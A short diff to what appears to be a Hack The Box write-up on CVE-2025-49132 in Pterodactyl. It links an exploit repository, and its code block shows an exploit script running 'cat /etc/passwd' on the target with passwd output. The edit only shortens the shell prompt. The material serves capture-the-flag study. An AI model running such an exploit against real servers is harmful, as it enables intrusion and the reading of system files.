@@ -404,7 +404,7 @@ found: [https://github.com/Ahmedf000/CVE-2025-49132_HTB_SEASON10]
 [https://cvefeed.io/vuln/detail/CVE-2025-49132]
 
 ```
-(venv) ajdev@rootbox:~/HTB/Pterodactyl/CVE-2025-49132_HTB_SEASON10$ ./exploit.sh cmd "cat /etc/passwd"
+$ ./exploit.sh cmd "cat /etc/passwd"
 [*] Executing: cat /etc/passwd
 nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
 wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
